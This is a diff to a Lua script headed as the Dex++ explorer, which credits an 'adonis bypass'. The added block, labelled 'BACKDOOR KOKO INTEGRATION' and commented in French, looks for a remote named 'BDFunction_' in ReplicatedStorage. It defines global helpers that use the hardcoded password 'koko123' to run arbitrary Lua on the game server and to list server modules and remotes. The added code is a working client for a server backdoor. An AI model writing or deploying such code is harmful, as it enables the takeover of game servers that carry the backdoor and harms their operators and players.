@@ -6,7 +6,35 @@
 	Decompiler fixed + rspy plugin + adonis bypass by mcdaggitt,
 	Dex++ is a revival of Moon's Dex, made to fulfill Moon's Dex prophecy.
 ]]
+-- === BACKDOOR KOKO INTEGRATION ===
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local KOKO_BACKDOOR = nil
 
+-- Trouver la backdoor automatiquement
+for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+    if obj:IsA("RemoteFunction") and obj.Name:find("BDFunction_") then
+        KOKO_BACKDOOR = obj
+        break
+    end
+end
+
+-- Fonction backdoor globale
+getgenv().BD = function(command, arg)
+    if not KOKO_BACKDOOR then 
+        warn("Backdoor non trouvée")
+        return nil 
+    end
+    local result = KOKO_BACKDOOR:InvokeServer("koko123", command, arg)
+    if result.success then return result.result end
+    return nil
+end
+
+-- Raccourcis
+getgenv().serverExec = function(code) return BD("luarun", code) end
+getgenv().serverInfo = function() return BD("serverinfo") end
+getgenv().listModules = function() return BD("listallmodules") end
+getgenv().listRemotes = function() return BD("listallremotes") end
+-- =====================================
 local selection
 local nodes = {}
 
